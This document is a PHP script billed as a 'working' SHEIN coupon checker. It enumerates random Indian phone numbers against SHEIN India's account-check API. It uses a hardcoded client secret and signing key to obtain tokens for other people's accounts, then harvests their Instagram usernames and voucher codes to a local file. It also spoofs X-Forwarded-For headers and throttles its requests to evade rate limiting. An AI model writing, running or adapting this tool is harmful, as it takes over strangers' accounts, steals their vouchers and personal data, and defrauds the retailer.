<?php
// File to save valid coupons
$validFile = getenv('USERPROFILE') . '/Desktop/Downloads/shein_valid.txt';

// Better HTTP function that works with all APIs
function httpCall($url, $data = null, $headers = [], $method = "GET") {
    $parsedUrl = parse_url($url);
    $host = $parsedUrl['host'];
    $path = $parsedUrl['path'] ?? '/';
    
    if (isset($parsedUrl['query'])) {
        $path .= '?' . $parsedUrl['query'];
    }
    
    $port = isset($parsedUrl['port']) ? $parsedUrl['port'] : ($parsedUrl['scheme'] === 'https' ? 443 : 80);
    
    // Add default headers
    if (empty($headers)) {
        $ip = randIp();
        $headers = [
            "X-Forwarded-For: $ip",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ];
    }
    
    // Build request
    $request = "$method $path HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    $request .= implode("\r\n", $headers) . "\r\n";
    
    if ($method === "POST" && $data) {
        $request .= "Content-Length: " . strlen($data) . "\r\n";
        $request .= "Connection: close\r\n\r\n";
        $request .= $data;
    } else {
        $request .= "Connection: close\r\n\r\n";
    }
    
    // Create socket
    $fp = @fsockopen('ssl://' . $host, $port, $errno, $errstr, 10);
    
    if (!$fp) {
        return "";
    }
    
    // Send request
    fwrite($fp, $request);
    
    // Get response
    $response = '';
    while (!feof($fp)) {
        $response .= fgets($fp, 128);
    }
    
    fclose($fp);
    
    // Split headers and body
    $parts = explode("\r\n\r\n", $response, 2);
    
    if (count($parts) > 1) {
        return $parts[1];
    }
    
    return "";
}

function randIp() { 
    return rand(100,200) . "." . rand(10,250) . "." . rand(10,250) . "." . rand(1,250); 
}

function genDeviceId() { 
    // Generate random device ID
    $chars = '0123456789abcdef';
    $deviceId = '';
    for ($i = 0; $i < 16; $i++) {
        $deviceId .= $chars[rand(0, 15)];
    }
    return $deviceId;
}

function generateIndianNumber() {
    // Generate numbers starting with 8 or 9 only
    $prefix = (rand(0, 1) == 0) ? '8' : '9';
    
    // Generate remaining 9 digits
    $number = $prefix;
    for ($i = 0; $i < 9; $i++) {
        $number .= rand(0, 9);
    }
    
    return $number;
}

function checkNumber($number, &$triedNumbers) {
    if (in_array($number, $triedNumbers)) {
        return false;
    }
    
    $triedNumbers[] = $number;
    echo "Checking: $number\n";
    
    $ip = randIp(); 
    $adId = genDeviceId();
    
    // Step 1: Get access token (EXACTLY like your old script)
    $url = "https://api.sheinindia.in/uaas/jwt/token/client";
    $headers = [
        "Client_type: Android/29",
        "Accept: application/json",
        "Client_version: 1.0.8",
        "User-Agent: Android",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "X-Tenant: B2C",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
    $res = httpCall($url, $data, $headers, "POST");
    
    if (empty($res)) {
        echo "Error: Could not get token (API Blocked)\n";
        sleep(1);
        return false;
    }
    
    $j = @json_decode($res, true);
    if (!$j || !isset($j['access_token'])) {
        echo "Error: Invalid token response\n";
        return false;
    }
    
    $access_token = $j['access_token'];
    echo "✓ Got token\n";
    
    // Step 2: Check if number is registered (EXACTLY like your old script)
    $url = "https://api.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
    $headers = [
        "Authorization: Bearer $access_token",
        "Requestid: account_check",
        "X-Tenant: B2C",
        "Accept: application/json",
        "User-Agent: Android",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data = "mobileNumber=$number";
    $res = httpCall($url, $data, $headers, "POST");
    
    if (empty($res)) {
        echo "Error: Account check failed\n";
        return false;
    }
    
    $j = @json_decode($res, true);
    
    if (!$j) {
        echo "Error: Invalid JSON from account check\n";
        return false;
    }
    
    if(isset($j['success']) && $j['success'] === false) {
        echo "✗ Number not registered\n";
        return false;
    }
    
    $encryptedId = $j['encryptedId'] ?? '';
    if(empty($encryptedId)) {
        echo "✗ No encrypted ID\n";
        return false;
    }
    
    echo "✓ Account exists\n";
    
    // Step 3: Generate SHEIN token (EXACTLY like your old script)
    $payload = json_encode([
        "client_type" => "Android/29",
        "client_version" => "1.0.8",
        "gender" => "",
        "phone_number" => $number,
        "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
        "user_id" => $encryptedId,
        "user_name" => ""
    ]);
    
    $headers = [
        "Accept: application/json",
        "User-Agent: Android",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/json; charset=UTF-8",
        "X-Forwarded-For: $ip"
    ];
    
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
    $res = httpCall($url, $payload, $headers, "POST");
    
    if (empty($res)) {
        echo "Error: SHEIN token generation failed\n";
        return false;
    }
    
    $j = @json_decode($res, true);
    
    if(!$j || empty($j['access_token'])) {
        echo "✗ No SHEIN token\n";
        return false;
    }
    
    $sheinverse_access_token = $j['access_token'];
    echo "✓ Got SHEIN token\n";
    
    // Step 4: Get user data and check for coupon (EXACTLY like your old script)
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
    $headers = [
        "Host: shein-creator-backend-151437891745.asia-south1.run.app",
        "Authorization: Bearer " . $sheinverse_access_token,
        "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/140.0.7339.207 Mobile Safari/537.36",
        "Accept: */*",
        "Origin: https://sheinverse.galleri5.com",
        "X-Requested-With: com.ril.shein",
        "Referer: https://sheinverse.galleri5.com/",
        "Content-Type: application/json",
        "X-Forwarded-For: $ip"
    ];
    
    $res = httpCall($url, "", $headers, "GET");
    
    if (empty($res)) {
        echo "Error: Could not get user data\n";
        return false;
    }
    
    $decoded = @json_decode($res, true);
    
    if (!$decoded || !isset($decoded['user_data']['instagram_data']['username'])) {
        echo "✗ No user data found\n";
        return false;
    }
    
    $username = $decoded['user_data']['instagram_data']['username'] ?? 'N/A';
    $voucher = $decoded['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
    $voucher_amount = $decoded['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
    $expiry_date = $decoded['user_data']['voucher_data']['expiry_date'] ?? '';
    $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';
    
    // Check if voucher is valid (not N/A)
    if ($voucher !== 'N/A' && !empty($voucher) && $voucher !== '') {
        echo "\n🎉✅🎉 COUPON FOUND! 🎉✅🎉\n";
        echo "================================\n";
        echo "Number: $number\n";
        echo "Instagram: $username\n";
        echo "Voucher Code: $voucher\n";
        echo "Amount: $voucher_amount\n";
        echo "Min Purchase: $min_purchase_amount\n";
        echo "Expiry Date: $expiry_date\n";
        echo "================================\n\n";
        
        // Save to file
        $data = "========================================\n";
        $data .= "Number: $number\n";
        $data .= "Instagram: $username\n";
        $data .= "Voucher Code: $voucher\n";
        $data .= "Amount: $voucher_amount\n";
        $data .= "Min Purchase: $min_purchase_amount\n";
        $data .= "Expiry Date: $expiry_date\n";
        $data .= "Found At: " . date('Y-m-d H:i:s') . "\n";
        $data .= "========================================\n\n";
        
        file_put_contents($GLOBALS['validFile'], $data, FILE_APPEND);
        
        // Play success sound (Windows)
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            echo "\x07"; // Bell sound
        }
        
        return true;
    } else {
        echo "✓ No coupon found\n";
        return false;
    }
}

// Main script
function clearScreen() {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        system('cls');
    } else {
        system('clear');
    }
}

clearScreen();
echo "========================================\n";
echo "SHEIN COUPON CHECKER - WORKING VERSION\n";
echo "========================================\n\n";
echo "Auto-generating Indian numbers (8 or 9 starting)\n";
echo "Saving valid coupons to: $validFile\n";
echo "Press Ctrl+C to stop\n\n";

// Create directory if it doesn't exist
$dir = dirname($validFile);
if (!is_dir($dir)) {
    mkdir($dir, 0777, true);
}

// Array to track tried numbers
$triedNumbers = [];
$foundCount = 0;
$checkedCount = 0;
$batchSize = 5;

while (true) {
    // Generate 5 numbers at once
    $numbers = [];
    for ($i = 0; $i < $batchSize; $i++) {
        $num = generateIndianNumber();
        // Ensure no duplicates
        while (in_array($num, $triedNumbers)) {
            $num = generateIndianNumber();
        }
        $numbers[] = $num;
    }
    
    // Display the batch
    echo "📱 Checking Batch: " . implode(" ", $numbers) . "\n";
    echo str_repeat("-", 50) . "\n";
    
    // Check each number
    foreach ($numbers as $number) {
        $checkedCount++;
        echo "\n[$checkedCount] ";
        
        if (checkNumber($number, $triedNumbers)) {
            $foundCount++;
            echo "✅ Valid coupon saved! (Total found: $foundCount)\n";
            
            // Pause for 2 seconds after finding coupon
            sleep(2);
        }
        
        // Small delay to avoid rate limiting
        usleep(500000); // 0.5 seconds
    }
    
    echo "\n" . str_repeat("=", 50) . "\n";
    echo "📊 Stats: Checked: $checkedCount | Found: $foundCount\n";
    echo str_repeat("=", 50) . "\n\n";
    
    // Wait 2 seconds before next batch
    echo "Waiting 3 seconds before next batch...\n";
    sleep(3);
    
    // Clear screen for next batch
    clearScreen();
    
    // Re-display header
    echo "========================================\n";
    echo "SHEIN COUPON CHECKER - WORKING VERSION\n";
    echo "========================================\n\n";
    echo "Auto-generating Indian numbers (8 or 9 starting)\n";
    echo "Saving valid coupons to: $validFile\n";
    echo "Press Ctrl+C to stop\n\n";
    echo "📊 Total Checked: $checkedCount | Total Found: $foundCount\n\n";
}
?>
